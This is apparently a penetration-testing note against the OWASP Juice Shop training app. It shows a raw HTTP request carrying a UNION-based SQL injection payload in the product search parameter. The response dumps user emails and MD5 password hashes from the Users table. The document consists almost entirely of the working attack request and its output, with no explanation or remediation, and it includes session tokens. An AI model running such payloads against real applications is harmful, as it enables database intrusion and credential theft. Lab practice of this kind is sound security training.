# SQL Injection

## Request

```http
GET /rest/products/search?q='))%20union%20select%20email,password,'3','4','5','6','7','8','9'%20from%20Users-- HTTP/1.1
Host: juice-shop:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MzQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIiLCJwYXNzd29yZCI6IjJhYzljYjdkYzAyYjNjMDA4M2ViNzA4OThlNTQ5YjYzIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEwLjAuMi4xNSIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA5LTAyIDEzOjI3OjMzLjgyNSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA5LTAyIDE1OjA5OjAwLjI3NSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTY4NTA2NDN9.vIv7MuJ64qyZyxvbrJQepxSfX6rk4OJLVPUz7tsC2kAO1FEDpyzPgLE7FsGdkFBZ2_wJ7qn5UIfZXHFq9w77i3vQfVxa8s52oSYRjbIw0ulYgx3djWqC_xG92Km2dLyS75aGFunNDgBu0znrUKSTpYgNjaEKI3fogfgFzHZZxhM
Connection: keep-alive
Referer: http://juice-shop:3000/
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=PvVjODoYRBMdv2h3txc5FPfVtzWuO6IE3sPvtLNUVKfa3Hokdbq518JQENKZ; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MzQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIiLCJwYXNzd29yZCI6IjJhYzljYjdkYzAyYjNjMDA4M2ViNzA4OThlNTQ5YjYzIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEwLjAuMi4xNSIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA5LTAyIDEzOjI3OjMzLjgyNSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA5LTAyIDE1OjA5OjAwLjI3NSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTY4NTA2NDN9.vIv7MuJ64qyZyxvbrJQepxSfX6rk4OJLVPUz7tsC2kAO1FEDpyzPgLE7FsGdkFBZ2_wJ7qn5UIfZXHFq9w77i3vQfVxa8s52oSYRjbIw0ulYgx3djWqC_xG92Km2dLyS75aGFunNDgBu0znrUKSTpYgNjaEKI3fogfgFzHZZxhM
Content-Length: 2
```

## Response

```json
{"id":"","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"%00","name":"d41d8cd98f00b204e9800998ecf8427e","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"''","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"J12934@juice-sh.op","name":"3c2abc04e4a6ea8f1327d0aae3714b7d","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"aaron@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"accountant@juice-sh.op","name":"963e10f92a70b4b463220cb4c5d636dc","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"adam@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"admin@juice-sh.op","name":"0192023a7bbd73250516f069df18b500","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"amy@juice-sh.op","name":"030f05e45e30710c3ad3c32f00de0473","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"andre@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"bender@juice-sh.op","name":"0c36e517e3fa95aabf1bbffc6744a4ef","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"bjoern.kimminich@gmail.com","name":"6edd9d726cbdc873c539e41ae8757b8c","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"bjoern@juice-sh.op","name":"7f311911af16fa8f418dd1a3051d6810","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"bjoern@owasp.org","name":"9283f1b2e9669749081963be0462e466","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"chris.pike@juice-sh.op","name":"10a783b9ed19ea1c67c3a27699f0095b","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"ciso@juice-sh.op","name":"861917d5fa5f1172f931dc700d81a8fb","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"demo","name":"fe01ce2a7fbac8fafaed7c982a04e229","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"emma@juice-sh.op","name":"402f1c4a75e316afec5a6ea63147f739","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"ethereum@juice-sh.op","name":"2c17c6393771ee3048ae34d6b380c5ec","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"george","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"jack@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"jason@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"jim@juice-sh.op","name":"e541ca7ecf72b8d1286474fc613e5e45","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"john@juice-sh.op","name":"00479e957b6b42c459ee5746478e4d45","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"leom@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"mary@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"mc.safesearch@juice-sh.op","name":"b03f4b0ba8b458fa0acdc02cdb953bc8","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"mickey@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"morty@juice-sh.op","name":"f2f933d0bb0ba057bc8e33b8ebd6d9e8","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"peter@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"stan@juice-sh.op","name":"e9048a3f43dd5e094ef733f3bd88ea64","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"steve@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"support@juice-sh.op","name":"3869433d74e3d0c86fd25562f836bc82","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"susie@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"testing@juice-sh.op","name":"b616a64605a07941fbd31868aea3b54b","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"uvogin@juice-sh.op","name":"05f92148b4b60f7dacd04cceebb8f1af","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"wendy","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"wendy@gmail.com","name":"2ac9cb7dc02b3c0083eb70898e549b63","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},
{"id":"wurstbrot@juice-sh.op","name":"9ad5b0492bbe528583e128d2a8941de4","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}
```
